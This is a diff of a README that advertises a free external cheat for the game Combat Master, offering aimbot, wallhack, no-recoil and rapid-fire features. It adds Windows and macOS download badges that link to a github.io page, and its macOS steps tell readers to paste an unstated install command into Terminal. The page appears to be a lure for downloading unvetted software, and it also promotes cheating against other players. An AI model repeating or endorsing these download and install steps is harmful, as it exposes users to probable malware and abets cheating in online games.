@@ -5,7 +5,7 @@
 [![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
 [![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
 
-> The most trusted **Combat Master External** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
+> The most trusted **Combat Master External** for 2026 — operates entirely outside the game process with no memory injection, providing a clean and undetected external cheat experience.
 
 <p align="center">
   <img src="https://raw.githubusercontent.com/CraftsmanPour/evidence-v2/main/evidence-v2.png" alt="Evidence V2" />
@@ -15,12 +15,11 @@
 
 ## ✨ Features
 
-🎯 &nbsp;**External Aimbot** — smooth pixel-based tracking
-👁️ &nbsp;**ESP / Wallhack** — full player skeleton overlay
-⚡ &nbsp;**Distance Indicators** — real-time target range
-🔧 &nbsp;**Triggerbot** — zero-latency auto-fire
-🗺️ &nbsp;**Radar Hack** — enemy minimap positions
-✅ &nbsp;**No Recoil** — external recoil script
+✅ &nbsp;**Silent Aimbot**
+✅ &nbsp;**ESP / Wallhack**
+✅ &nbsp;**No Recoil**
+✅ &nbsp;**Rapid Fire**
+✅ &nbsp;**Player ESP**
 
 ---
 
@@ -46,10 +45,14 @@
 5. 🎮 Launch **Combat Master** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
+
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 **Menu Controls**
 
@@ -74,35 +77,16 @@
 
 ---
 
-## 📥 Download
-
-<p align="center">
-  <a href="https://beatowlrouse.github.io/windownload/">
-    <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
-  </a>
-  &nbsp;&nbsp;
-  <a href="https://beatowlrouse.github.io/macdownload/">
-    <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
-  </a>
-</p>
-
----
-
 ## ❓ FAQ
 
 **Is it really undetectable?**
-Yes. Combat Master External uses external operation — no memory injection, no DLL files.
+Yes. Combat Master External uses an external process — no memory injection, no DLL files.
 
 **Does it work on Mac?**
 Yes. Open Terminal, paste the install command from the macOS section above.
 
 **Is it free?**
 Completely free. No trials, no subscriptions.
-
-**Safety tips:**
-- Use alt accounts for initial testing
-- Keep the tool updated
-- Don't stream with the overlay visible
 
 ---
 
